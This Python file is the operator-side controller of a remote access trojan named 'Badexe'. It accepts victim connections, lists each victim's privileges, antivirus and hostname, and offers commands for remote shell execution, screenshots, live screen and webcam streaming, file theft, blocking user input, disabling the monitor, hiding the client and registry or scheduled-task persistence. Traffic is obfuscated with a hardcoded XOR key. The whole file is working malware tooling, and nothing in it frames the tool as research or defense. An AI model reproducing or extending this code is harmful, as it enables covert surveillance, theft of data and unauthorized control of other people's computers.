from time import sleep
import threading
import hashlib
import base64
import codecs
import socket
import struct
import random
import string
import time
import sys
import os
#from vidstream import StreamingServer


###################COLORS#################
color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_BLU = '\033[94m'
color_PURP = '\033[35m'
color_reset = '\033[0m'
green_plus = color_GRE + "[+] " + color_reset

banner = """

888888b.                 888                            
888  "88b                888                            
888  .88P                888                            
8888888K.   8888b.   .d88888  .d88b.  888  888  .d88b.  
888  "Y88b     "88b d88" 888 d8P  Y8b `Y8bd8P' d8P  Y8b 
888    888 .d888888 888  888 88888888   X88K   88888888 
888   d88P 888  888 Y88b 888 Y8b.     .d8""8b. Y8b.     
8888888P"  "Y888888  "Y88888  "Y8888  888  888  "Y8888  
                                                                                                         
"""



######ARRAYS#####
clients = []
clients_info = []

current_dir = ""

######SERVER_VARS######
PORT = 23478
SERVER = '192.168.56.1'
ADDR = (SERVER, PORT)
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

################MODULES####################################


def create_htmlfile(filename):
    html = "<!DOCTYPE html><html><head><title>screenshare</title></head><body><img id=\"disp\"><script>function reload() {var count = new Date().getTime();var imagetodisplay = document.getElementById(\"disp\");imagetodisplay.src = \"" + filename + "#\" + count;imagetodisplay.style = \"display:\";}setInterval(function() {reload();},30);</script></body></html>"

    with open(filename + '.html', 'w') as f:
        f.write(html)
        f.close()


def str_xor(message):
    key = '8aLdrdWLSiE4UMw4kfMnWIG0qO50jqDgtjprzWdHrsaYBXhdSiRwgr8EJ2u32lwZtoVgurcPmQXJYV0SGVYRUFAfHzyqyz46zvlQgx8eA0ZcJt6uRWZkDxMRc30P35IAhTmIkXOv408LjpREnZXYxz7ZDauTRMQmbu7MJsGCRB7HDBSMuqqRgN1C4GOvS2XEUFI5ogqJLxlnHde6nm8f9qQdyKPEcq1alS9Lvb6NtiT2iaXPnRnBzUrjPIVq9lVoLWFnPE5QTB3yWWLLqvbw6sIkX8WFbbtBqHSe3D1XAE0IB2wqOOUTJ8YvN6BOfdKWWiLJl6rq7gH9VIquwZ7L1DQmVra2I4oyFd3HUL6J995aO82epY1Ti5aSYetjMWx8XmDe6YedRTVcQWQyjpmEeN6QFGsaEcW8hC4tv0ZVooNna3CAc9hLPX2fw0XwjvDKPYZcjx7mprJoLWFedbgKmsNhwml6LiCAq00blZb4kRS948k3md7yA1QsTa4JERh7cUfZcVPtZAEEuoTzeHuv0ZDRew9XQtD3NH3i8v6mbQQPRBTE8ihvLmZ6ynAIvIZMJDcyA7rZOKDvrzaZDGg9QzZN0MI9B8cCY8uqtOEzrWCYLM4hmwTz3Pez8z2bYMzj7TylISKeuCghvboiMoZqJXPIdxUByBsb0SmXbZHvGcQNSAw5kADH4NY1ucOePRkzsAw3qByO0peUkIUDA4GCL3HNObr1ZDN0dCwYaeGCsWWTGSYtqAwDlIWxc3WohcUxTbRePAG9tLmQ7Tkwj0hQXHWwiKEFYuGeETzldVLuHhFLI3BQ3kSVGPGJqLa2je9HDH1ImMYVsR1PmpMatUcuGeQQiArJrbgvL5qlTdlhQR0CwI6lyxe3HVb6jGQK3ysWD71O'
    out = ""
    count = 0
    for x in message:
        out += chr(ord(x) ^ ord(key[count]))
        if count == len(key):
            count = 0
    return out

def parse_args(inp):
    commands = []
    if inp.find(" ") == -1:
        commands.append(inp)
        return commands

    else:
        commands.append(inp[:inp.find(" ")])
        commands.append(inp[(inp.find(" ")+1):])
        return commands

def print_clients():
    print("Client_ID       IP:PORT                      OS                       Perms       VM                     Anti-Virus                Username       Hostname")

    print("---------------------------------------------------------------------------------------------------------------------------------------------------------------------")
    c = 0
    for x in clients_info:
        print(color_GRE + str(c).ljust(15), x)
        c += 1


def recieve_file(shell_id, file_name):

    file_data = big_recieve(shell_id)
    #remember to base64 decode the file_data
    with open(file_name, "wb") as f:
        f.write(file_data)
        f.close()


def big_recieve(shell_id):
    #first the client send the size of the data so we are not guessing up to 12
    data_size = clients[shell_id].recv(128)
    # we send acknowledgement of recieve so that the buffer is empty
    send(shell_id, "few")
    #cut the data_size down to 12 chars which is all we should be getting
    data_size = data_size[:12]
    data_size = data_size.decode()
    data_size = str_xor(data_size)
    data_size = int(data_size)
    total_data = ''
    data = '';
    #loop through the data until it is all got
    while len(total_data) < data_size:
        try:
            data = clients[shell_id].recv(data_size).decode()
            if data:
                total_data += data
            else:
                break
        except BaseException as e:
            print(e)
            print("Error in here")
            break
    msg = total_data
    msg = base64.b64decode(msg)
    #print(msg)
    #msg = str_xor(msg)

    return msg

def recieve(msg):
    msg = str_xor(msg)
    return msg

def send(client_id, msg): # send data to a socket client
    msg = str_xor(msg)
    clients[client_id].sendall(msg.encode())

def handle_client(conn, addr): # function to generate a new thread for each client
    print("\n" + color_BLU + f"[NEW CONNECTION] {addr} connected.\n" + color_reset)
    info = recieve(conn.recv(2048).decode()) # recieve client info DH13
    dat = info.split(",")
    #25 12 15
    info = dat[0].ljust(25)
    info += dat[1].ljust(12)
    info += dat[2].ljust(23)
    info += dat[3].ljust(25)
    info += dat[4].ljust(16)
    info += dat[5]

    clients.append(conn)
    clients_info.append(str(addr).ljust(29) + info)
    connected = True
    while connected:
        continue

    conn.close()


def start():
    server.listen()
    print(color_BLU + f"[LISTENING] Server is listening on {ADDR}" + color_reset)
    while True:
        conn, addr = server.accept()
        try:
            thread = threading.Thread(target=handle_client, args=(conn, addr))
            thread.start()
        except BaseException as e:
            print(color_RED + "[ERROR] " + str(e) + color_reset)

        print("\n" +color_BLU + f"[ACTIVE CONNECTIONS] {len(clients) + 1}" + color_reset)
        print("Enter a command: ")

#this starts the server which calls start() to create the handle client thread
def server_start():
    print("[STARTING] server is starting...")
    try:
        start_thread = threading.Thread(target=start)
        start_thread.start()
    except BaseException as e:
        print(color_RED + "[ERROR] " + str(e) + color_reset)
    sleep(1)

#TODO at line 77 print(color_GRE + f"[ACTIVE CONNECTIONS] {len(clients) + 1}" + color_reset) we need a check
# so when a new client connects it checks all clients for alive status and removes any who died to keep
# accurate count
def main():

    os.system("cls")
    print(banner)
    server_status = False
    skip = False
    while True:
        if skip == False: # dirty way to do migration with the hide command
            command = parse_args(input(color_reset + "Enter a command: ")) # get our command while not in  the shell

        if(command[0] == "shell" and server_status == True):
            skip = False
            try:
                #get the shell ID and then get all needed info
                shell_id = int(command[1])
                print(color_GRE + "[*] Attempting to connect to the shell" + color_reset)
                send(shell_id, "get_host_info")
                recieve(clients[shell_id].recv(29).decode()) #command recieved buffer
                client_info = recieve(clients[shell_id].recv(2048).decode())

            except socket.error:
                print(color_RED + "[ERROR] The client could not be reached" + color_reset)
                print(color_YELL + "[WORKING] Removing client from list")
                del clients[shell_id]
                del clients_info[shell_id]
                print(color_GRE + "[*] Closing the shell" + color_reset)
                continue
            except KeyboardInterrupt:
                print("\n" + color_GRE + "[*] Exiting the shell" + color_reset)
                sleep(2)
                os.system('cls')
                print(banner)
                continue
            except BaseException as e:
                print(e)
                print("Howed you fuck it up?")
                continue

            #if we made it here were in the shell
            shell = True
            print(color_GRE + "[*] Connected to the shell" + color_reset)
            commands = []
            while shell:
                try:
                    shell_command = parse_args(input(color_reset + client_info))
                    if (shell_command[0] == "background" or shell_command[0] == "bg"):
                        print(color_GRE + "[*] Exiting the shell" + color_reset)
                        sleep(2)
                        os.system('cls')
                        print(banner)
                        break
                    elif (shell_command[0] == "cls" or shell_command[0] == "clear"): # works in console not ide
                        cls = lambda: os.system('cls')
                        cls()
                        print(banner)
                    elif (shell_command[0] == "webcam_ss"): # not working properly
                        send(shell_id, shell_command[0])
                        print(recieve(clients[shell_id].recv(29).decode())) #command recieved buffer
                        if recieve(clients[shell_id].recv(3).decode()) == "err":
                            print(color_YELL + "[!]" + color_reset + " Camera Error")
                        else:
                            recieve_file(shell_id, (''.join(random.choices(string.ascii_lowercase, k=5)) + "_webcam.bmp"))
                    elif (shell_command[0] == "webcam_sshare"):
                        ss = True
                        filename = (''.join(random.choices(string.ascii_lowercase, k=5)) + "webcam.bmp")
                        create_htmlfile(filename)
                        print(green_plus + "Starting the webcam stream: press Ctrl+c to end it")
                        while ss:
                            sleep(.3)
                            try:
                                send(shell_id, "webcam_ss")
                                recieve(clients[shell_id].recv(29).decode()) # command recieved buffer
                                if recieve(clients[shell_id].recv(3).decode()) == "err": # if fo some reason the camera is not connected or detected this error will hit
                                    print(color_YELL + "[!]" + color_reset + " Camera Error")
                                    break;
                                recieve_file(shell_id, filename)
                            except KeyboardInterrupt:
                                print(green_plus + "Stopping the camera stream")
                                send(shell_id, "ytrg4") # disgusting way to clear le buffer
                                recieve(clients[shell_id].recv(662767).decode())
                                send(shell_id, "ytr1g4")
                                recieve(clients[shell_id].recv(662767).decode())
                                send(shell_id, "ytr34")
                                recieve(clients[shell_id].recv(662767).decode())
                                ss = False
                                break

                    elif (shell_command[0] == "screenshot"):
                        send(shell_id, shell_command[0])
                        print(recieve(clients[shell_id].recv(29).decode()))  # command recieved buffer
                        recieve_file(shell_id, (''.join(random.choices(string.ascii_lowercase, k=5)) + "_screenshot.jpg"))
                    elif (shell_command[0] == "screenshare"):
                        ss = True
                        filename = (''.join(random.choices(string.ascii_lowercase, k=5)) + "_screenshare.jpg")
                        create_htmlfile(filename)
                        print(green_plus + "Starting the screenshare: press Ctrl+c to end it")
                        while ss:
                            sleep(.3)
                            try:
                                send(shell_id, "screenshot")
                                recieve(clients[shell_id].recv(29).decode()) # command recieved buffer
                                recieve_file(shell_id, filename)
                            except KeyboardInterrupt:
                                print(green_plus + "Stopping the screenshare")
                                send(shell_id, "ytrg4") # disgusting way to clear le buffer
                                recieve(clients[shell_id].recv(662767).decode())
                                send(shell_id, "ytr1g4")
                                recieve(clients[shell_id].recv(662767).decode())
                                send(shell_id, "ytr34")
                                recieve(clients[shell_id].recv(662767).decode())
                                ss = False
                                break

                    elif (shell_command[0] == "block_input" and len(shell_command) > 1):
                        send(shell_id, shell_command[0])
                        print(recieve(clients[shell_id].recv(29).decode()))  # command recieved buffer
                        send(shell_id, shell_command[1])
                        print(recieve(clients[shell_id].recv(512).decode()))
                    elif (shell_command[0] == "cmd" and len(shell_command) > 1):
                        send(shell_id, shell_command[0])
                        print(recieve(clients[shell_id].recv(29).decode()))  # command recieved buffer
                        send(shell_id, shell_command[1])
                        print(recieve(clients[shell_id].recv(62767).decode()))
                    elif (shell_command[0] == "persist" and len(shell_command) > 1):
                        send(shell_id, shell_command[0])
                        print(recieve(clients[shell_id].recv(29).decode()))  # command recieved buffer
                        send(shell_id, shell_command[1])
                        print(recieve(clients[shell_id].recv(2048).decode()))
                    elif (shell_command[0] == "disable_screen" and len(shell_command) > 1):
                        send(shell_id, shell_command[0])
                        print(recieve(clients[shell_id].recv(29).decode()))  # command recieved buffer
                        send(shell_id, shell_command[1])
                        print(recieve(clients[shell_id].recv(256).decode()))
                    elif (shell_command[0] == "hide"):
                        send(shell_id, shell_command[0])
                        print(recieve(clients[shell_id].recv(29).decode()))  # command recieved buffer
                        print(green_plus + "New process spawned this one is ending better pull not now...")
                        del clients[shell_id]
                        del clients_info[shell_id]
                        command[1] = len(clients) - 1
                        print("\n" + color_GRE + "[*] Exiting the shell" + color_reset)
                        skip = True
                        sleep(3)
                        #os.system('cls')
                        #print(banner)
                        break
                    elif (shell_command[0] == "message" and len(shell_command) > 1):
                        send(shell_id, shell_command[0])
                        print(recieve(clients[shell_id].recv(29).decode()))  # command recieved buffer
                        send(shell_id, shell_command[1])
                        print(recieve(clients[shell_id].recv(256).decode()))
                    elif (shell_command[0] == "download" and len(shell_command) > 1):
                        send(shell_id, shell_command[0])
                        print(recieve(clients[shell_id].recv(29).decode()))  # command recieved buffer
                        send(shell_id, shell_command[1])
                        fn = input("Enter a local filename: ")
                        recieve_file(shell_id, fn)



                    elif (shell_command[0] == "kill"):
                        send(shell_id, shell_command[0])
                        print(recieve(clients[shell_id].recv(29).decode()))  # command recieved buffer
                        send(shell_id, "wefwe21")
                        print(recieve(clients[shell_id].recv(256).decode()))
                        del clients[shell_id]
                        del clients_info[shell_id]
                        print("\n" + color_GRE + "[*] Exiting the shell" + color_reset)
                        #sleep(2)
                        #os.system('cls')
                        #print(banner)
                        break


                    elif (shell_command[0] == "help" or shell_command[0] == "-help"):
                        print("Commands".ljust(25), "Description")
                        print("background or bg".ljust(25), "Backgrounds the shell")
                        print("cls / clear".ljust(25), "Clears the console")
                        print("screenshot".ljust(25), "Takes a screenshot")
                        print("screenshare".ljust(25), "Opens a screenshare session")
                        print("webcam_ss".ljust(25), "Takes a picture from the webcam")
                        print("webcam_sshare".ljust(25), "Opens a webcam stream session")
                        print("hide".ljust(25), "Moves the client file to a new directory and restarts the connection")
                        print("block_input [bool]".ljust(25), "Disables keyboard and mouse input: args [true, false] [Admin Priv Required]")
                        print("cmd [command]".ljust(25), "Executes a command on the client machine")
                        print("persist [type]".ljust(25), "Creates persistance in order to survive a reboot: Types tasksch [Admin Priv Required], hkcu, hkcu-cmd, hklm [Admin Priv Required], cmd, cmd-cmd")
                        print("disable_screen [bool]".ljust(25), "Disables computer monitor: args [true, false]")
                        print("download [filename]".ljust(25), "Downloads a file from the client to the server [REQUIRES FULL PATH TO FILE]")
                        print("message [message]".ljust(25), "Creates a popup on the client machine with [message]")
                        print("kill".ljust(25), "Kills the client process")



                    else:
                        print(color_YELL + "[!] Thats not a command dummy" + color_reset)

                except socket.error:
                    print(color_RED + "[ERROR] The client could not be reached")
                    print(color_YELL + "[WORKING] Removing client from list")
                    del clients[shell_id]
                    del clients_info[shell_id]
                    print(color_GRE + "[*] Closing the shell" + color_reset)
                    break
                except KeyboardInterrupt:
                    print("\n" + color_GRE + "[*] Exiting the shell" + color_reset)
                    #sleep(3)
                    #os.system('cls')
                    #print(banner)
                    break
                except BaseException as e:
                    print(str(e))
                    print("Bruh u a dummy")
                    continue

        elif(command[0] == "killall"):
            for x in range(len(clients)):
                try:
                    send(x, "kill")
                    recieve(clients[x].recv(29).decode())
                    send(x, "HUIG$")
                    recieve(clients[x].recv(128).decode())
                except BaseException:
                    continue
            clients.clear()
            clients_info.clear()
        elif(command[0] == "clients" and server_status == True):
            #clients = alive_chk_clients()
            #clients_info = alive_chk_clinets_info()
            print_clients()
        elif (command[0] == "server_start" and server_status == True):
            print(color_YELL + "Server is already running" + color_reset)
        elif (command[0] == "server_start" and server_status == False):
            server_start()
            server_status = True;
        elif (command[0] == "cls" or command[0] == "clear"): # does not work in ide but in regular console
            cls = lambda: os.system('cls')
            cls()
            print(banner)
        elif (command[0] == "clients" and server_status == False):
            print(color_RED + "[ERROR] Please start the server to use that command" + color_reset)
        elif (command[0] == "shell" and server_status == False):
            print(color_RED + "[ERROR] Please start the server to use that command" + color_reset)
        elif((command[0] == "help" or command[0] == "-help") and server_status == False):
            print("Commands".ljust(25), "Description")
            print("server_start".ljust(25), "Starts the server")

        elif ((command[0] == "help" or command[0] == "-help") and server_status == True):
            print("Commands".ljust(25), "Description")
            print("shell [client_ID]".ljust(25), "Connects to a remote shell")
            print("clients".ljust(25), "Lists all connected  [server must be running]")
            print("killall".ljust(25), "Runs the kill command on every client")
        elif (command[0] == "exit"):
            break
        else:
            print("Invalid input try using help")

if __name__ == "__main__":
    main()